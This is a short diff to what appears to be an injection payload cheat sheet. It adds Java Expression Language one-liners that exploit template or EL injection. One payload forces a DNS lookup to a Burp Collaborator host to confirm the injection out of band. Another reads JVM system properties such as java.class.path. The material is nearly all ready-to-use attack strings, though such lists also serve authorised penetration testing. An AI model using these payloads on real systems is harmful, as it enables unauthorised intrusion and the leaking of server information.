@@ -149,6 +149,16 @@ ${1+1}
 #{1+1}
 ```
 
+### Expression Language EL - One-Liner injections not including code execution
+
+```java
+// DNS Lookup
+${"".getClass().forName("java.net.InetAddress").getMethod("getByName","".getClass()).invoke("","xxxxxxxxxxxxxx.burpcollaborator.net")}
+
+// JVM System Property Lookup (ex: java.class.path)
+${"".getClass().forName("java.lang.System").getDeclaredMethod("getProperty","".getClass()).invoke("","java.class.path")}
+```
+
 ### Expression Language EL - Code Execution
 
 
